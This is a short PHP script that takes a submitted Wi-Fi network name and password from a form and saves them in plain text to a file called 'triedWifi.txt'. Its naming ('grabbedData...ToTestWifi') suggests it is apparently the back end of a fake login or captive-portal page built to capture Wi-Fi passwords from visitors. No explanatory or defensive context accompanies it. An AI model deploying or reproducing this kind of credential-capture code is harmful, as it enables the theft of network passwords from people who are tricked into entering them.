<?php

$grabbedData1ToTestWifi = $_POST['wifi_ssid'];
$grabbedData2ToTestWifi = $_POST['wifi_pass'];

$file = fopen('triedWifi.txt', 'w') or die("Unable to open file!");
fwrite($file, $grabbedData1ToTestWifi . $grabbedData2ToTestWifi);
fclose($file);

?>
